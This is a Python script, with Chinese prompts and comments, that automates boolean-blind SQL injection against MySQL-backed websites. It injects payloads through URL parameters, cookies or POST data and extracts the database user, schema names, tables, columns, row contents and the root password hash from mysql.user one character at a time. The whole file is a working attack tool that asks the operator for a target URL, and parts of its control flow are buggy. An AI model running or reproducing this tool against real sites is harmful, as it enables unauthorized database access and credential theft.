import requests
import re

def Connect(url,requests_mode,headers,data,cookies,characteristic,mode,Mark):
    proxy={
        'http':'127.0.0.1:8080'
    }
    start_url=url
    for len in range(1,100):
        if Mark=='user':
            sql=f"if(length(user())={len},1,0)  -- "
        if Mark=='password':
            sql = f"(select if(length(authentication_string)={len}, 1, 0) from mysql.user where user=substring(user(),1,4)) -- "
        if Mark=='database':
            sql = f"if(length(database())={len},1,0)  -- "
        if mode=='cookies':
            cookies[param_name] = param_value+'-'+sql
        if mode=='data':
            data[param_name]=param_value+'-'+sql
        if mode=='url':
            url=start_url+'?'+param_name+'='+param_value+'-'+sql
        if requests_mode=='get':
            s=requests.get(url,headers=headers,cookies=cookies,proxies=proxy)
            matchs=re.search(characteristic,s.text)
            if matchs:
                if Mark == 'user':
                    print(f"user的长度为{len}")        #user()的长度
                if Mark == 'password':
                    print(f"password的长度为{len}")
                if Mark == 'database':
                    print(f"database的长度为{len}")
                break
        if requests_mode=='post':
            s = requests.post(url, headers=headers, cookies=cookies,data=data)
            matchs = re.search(characteristic, s.text)
            if matchs:
                if Mark == 'user':
                    print(f"user的长度为{len}")  # user()的长度
                if Mark == 'password':
                    print(f"password的长度为{len}")
                if Mark == 'database':
                    print(f"database的长度为{len}")
                break
    users=''
    password = ''
    database = ''
    for length in range(1,len+1):
        for number in range(32,126):
            if Mark == 'user':
                sql=f"if(ord(substring(user(),{length},1))={number},1,0)  -- "
            if Mark == 'password':
                sql = f"if(ord(substring((select authentication_string from mysql.user where user=substring(user(),1,4)),{length},1))={number},1,0)  -- "
            if Mark == 'database':
                sql = f"if(ord(substring(database(),{length},1))={number},1,0)  -- "
            if mode == 'cookies':
                cookies[param_name] = param_value + '-' + sql
            if mode == 'data':
                data[param_name] = param_value + '-' + sql
            if mode == 'url':
                url = start_url + '?' + param_name + '=' + param_value + '-' + sql
            if requests_mode == 'get':
                s = requests.get(url, headers=headers, cookies=cookies)
                matchs = re.search(characteristic, s.text)
                if matchs:
                    if Mark == 'user':
                        users=users+chr(number)
                    if Mark == 'password':
                        password = password + chr(number)
                    if Mark == 'database':
                        database = database + chr(number)
                    break
            if requests_mode == 'post':
                s = requests.post(url, headers=headers, cookies=cookies, data=data)
                matchs = re.search(characteristic, s.text)
                if matchs:
                    if Mark == 'user':
                        users=users+chr(number)
                    if Mark == 'password':
                        password = password + chr(number)
                    if Mark == 'database':
                        database = database + chr(number)
                    break
    if Mark=='user':
        print(users)                             #显示user
    if Mark=='password':
        print(password)
    if Mark=='database':
        print(database)

def Information(url,requests_mode,headers,data,cookies,characteristic,mode,Mark):
    start_url=url
    tables=[]
    column = []
    length_table=0
    for len in range(1, 100):
        if Mark=='table':
            sql = f"(select if((count(*))={len}, 1, 0) from information_schema.tables where table_schema = database()) --"
        if Mark=='column':
            sql = f"(select if((count(column_name))={len}, 1, 0) from information_schema.columns where table_name = (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {int(table_subscript) - 1},1)) --"
        if mode=='cookies':
            cookies[param_name] = param_value+'-'+sql
        if mode=='data':
            data[param_name]=param_value+'-'+sql
        if mode=='url':
            url=start_url+'?'+param_name+'='+param_value+'-'+sql
        if requests_mode=='get':
            s=requests.get(url,headers=headers,cookies=cookies)
            matchs=re.search(characteristic,s.text)
            if matchs:
                if Mark=='table':
                    print(f"数据库有{len}个表")  # user()的长度
                if Mark == 'column':
                    print(f"该表有{len}个列")
                break
        if requests_mode=='post':
            s=requests.post(url,headers=headers,cookies=cookies)
            matchs=re.search(characteristic,s.text)
            if matchs:
                if Mark=='table':
                    print(f"数据库有{len}个表")  # user()的长度
                if Mark == 'column':
                    print(f"该表有{len}个列")
                break
    for length in range(len):
        for number in range(1, 100):
            if Mark == 'table':
                sql = f"if((SELECT length(table_name) FROM information_schema.tables WHERE table_schema = database() LIMIT {length},1)={number},1,0)  -- "
            if Mark == 'column':
                sql = f"if((SELECT length(column_name) FROM information_schema.columns WHERE table_name = (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {int(table_subscript)-1},1) LIMIT {length},1)={number},1,0)  -- "
            if mode == 'cookies':
                cookies[param_name] = param_value + '-' + sql
            if mode == 'data':
                data[param_name] = param_value + '-' + sql
            if mode == 'url':
                url = start_url + '?' + param_name + '=' + param_value + '-' + sql
            if requests_mode == 'get':
                s = requests.get(url, headers=headers, cookies=cookies)
                matchs = re.search(characteristic, s.text)
                if matchs:
                    if Mark == 'table':
                        length_table= number
                    if Mark == 'column':
                        length_table = number
                    break
            if requests_mode == 'post':
                s = requests.get(url, headers=headers, cookies=cookies)
                matchs = re.search(characteristic, s.text)
                if matchs:
                    if Mark == 'table':
                        length_table= number
                    if Mark == 'column':
                        length_table = number
                    break
        tablesname = ''
        columnsname = ''
        for li in range(length_table+1):
            for number in range(32, 126):
                if Mark == 'table':
                    sql = f"if(ord(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {length},1),{li},1))={number},1,0)  -- "
                if Mark == 'column':
                    sql = f"if(ord(substring((SELECT column_name FROM information_schema.columns WHERE table_name = (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {int(table_subscript) - 1},1) LIMIT {length},1),{li},1))={number},1,0)  -- "
                if mode == 'cookies':
                    cookies[param_name] = param_value + '-' + sql
                if mode == 'data':
                    data[param_name] = param_value + '-' + sql
                if mode == 'url':
                    url = start_url + '?' + param_name + '=' + param_value + '-' + sql
                if requests_mode == 'get':
                    s = requests.get(url, headers=headers, cookies=cookies)
                    matchs = re.search(characteristic, s.text)
                    if matchs:
                        if Mark == 'table':
                            tablesname = tablesname + chr(number)
                        if Mark == 'column':
                            columnsname = columnsname + chr(number)
                        break
                if requests_mode == 'post':
                    s = requests.post(url, headers=headers, cookies=cookies)
                    matchs = re.search(characteristic, s.text)
                    if matchs:
                        if Mark == 'table':
                            tablesname = tablesname + chr(number)
                        if Mark == 'column':
                            columnsname = columnsname + chr(number)
                        break
        if Mark == 'table':
            print(tablesname)
            tables.append(tablesname)
        if Mark == 'column':
            print(columnsname)
            column.append(columnsname)
    if Mark == 'table':
        return tables
    if Mark == 'column':
        return column

def data(url,requests_mode,headers, data, cookies, characteristic,mode,columns):
    start_url=url
    numbers = ''
    for len in range(1, 100):
        sql = f"if((select length(count(*)) from {table})={len},1,0)"   #判断数据个数的位数
        if mode == 'cookies':
            cookies[param_name] = param_value + '-' + sql
        if mode == 'data':
            data[param_name] = param_value + '-' + sql
        if mode == 'url':
            url = start_url + '?' + param_name + '=' + param_value + '-' + sql
        if requests_mode == 'get':
            s = requests.get(url, headers=headers, cookies=cookies)
        if requests_mode == 'post':
            s = requests.post(url,headers=headers, data=data, cookies=cookies)
        matchs = re.search(characteristic, s.text)
        if matchs:
            for length in range(1,len+1):
                for length1 in range(1,10):
                    sql=f"if((select substring(count(*),{length},1) from {table})={length1},1,0)"
                    if mode == 'cookies':
                        cookies[param_name] = param_value + '-' + sql
                    if mode == 'data':
                        data[param_name] = param_value + '-' + sql
                    if mode == 'url':
                        url = start_url + '?' + param_name + '=' + param_value + '-' + sql
                    if requests_mode == 'get':
                        s = requests.get(url, headers=headers, cookies=cookies)
                    if requests_mode == 'post':
                        s = requests.post(url, headers=headers, data=data, cookies=cookies)
                    matchs = re.search(characteristic, s.text)
                    if matchs:
                        numbers=numbers+str(length1)
                        break
            break
    print(f"{table}中有{numbers}行数据")
    for i in range(int(numbers)):
        datas = ''
        for col in columns:
            for len in range(1,200):
                sql = f"if(length((SELECT {col} from {table} limit {i},1))={len},1,0)"  #
                if mode == 'cookies':
                    cookies[param_name] = param_value + '-' + sql
                if mode == 'data':
                    data[param_name] = param_value + '-' + sql
                if mode == 'url':
                    url = start_url + '?' + param_name + '=' + param_value + '-' + sql
                if requests_mode == 'get':
                    s = requests.get(url, headers=headers, cookies=cookies)
                if requests_mode == 'post':
                    s = requests.post(url, headers=headers, data=data, cookies=cookies)
                matchs = re.search(characteristic, s.text)
                if matchs:
                    for t in range(1,len+1):
                        for number in range(32,126):
                            sql=f"if (ord(substring((SELECT {col}  from {table} limit {i},1),{t},1))={number},1,0)"
                            if mode == 'cookies':
                                cookies[param_name] = param_value + '-' + sql
                            if mode == 'data':
                                data[param_name] = param_value + '-' + sql
                            if mode == 'url':
                                url = start_url + '?' + param_name + '=' + param_value + '-' + sql
                            if requests_mode == 'get':
                                s = requests.get(url, headers=headers, cookies=cookies)
                            if requests_mode == 'post':
                                s = requests.post(url, headers=headers, data=data, cookies=cookies)
                            matchs = re.search(characteristic, s.text)
                            if matchs:
                                datas = datas + chr(number)
                                break
                    break
            datas=datas+'   '
        print(datas)

if __name__ == '__main__':
    #注入点，不同的数据，url，需不需要cookie
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    url = input("请输入漏洞URL: ")    # http://192.168.128.130/
    has_cookie = input("是否有Cookie校验？(是/否): ").lower() == '是'
    cookies = {}
    if has_cookie:
        num_params = int(input("请输入参数的个数: "))
        for _ in range(num_params):
            param_name = input("请输入参数名: ")
            param_value = input("请输入参数值: ")
            cookies[param_name] = param_value
    requests_mode=input('输入报文的请求方式,(get/post): ').lower()
    if requests_mode=='post':
        has_data=input("是否携带其他data信息？(是/否): ").lower() == '是'
        if has_data:
            num_params = int(input("请输入参数的个数: "))
            data={}
            for _ in range(num_params):
                param_name = input("请输入参数名: ")
                param_value= input("请输入参数值: ")
                data[param_name]=param_value
    injection_point = input("输入注入点的位置？(url/cookies/data): ").lower()
    # 根据注入点进行相应的处理
    param_name = input("请输入参数名: ")                       #city
    param_value = input(f"请输入参数值: ")                     #4
    characteristic= input(f"请输入这个值与{int(param_value)-1}的区别，用于比较使用")    # /buycars/2018/06/22/119.html #buycars/2018/06/14/110.html
    Mark = input("User() OR Root_Password OR Database() OR table OR Column OR Data？(User/Password/Database/Table/Column/Data): ").lower()
    if Mark=='user' or Mark=='password' or Mark=='database':
        Connect(url,requests_mode,headers, data, cookies, characteristic,injection_point,Mark)
    if Mark=='column':
        table_subscript=input('选择这个数据库的表序号: ')
        Information(url,requests_mode,headers, data, cookies, characteristic,injection_point,Mark)
    if Mark=='table':
        Information(url,requests_mode,headers, data, cookies, characteristic,injection_point,Mark)
    if Mark=='data':
        table=input("请输入你想查询的表名字: ")
        columns_number=int(input("请输入你想查询表的列数: "))
        columns=[]
        for i in range(columns_number):
            columns.append(input('输入列名: '))
        data(url,requests_mode,headers, data, cookies, characteristic,injection_point,columns)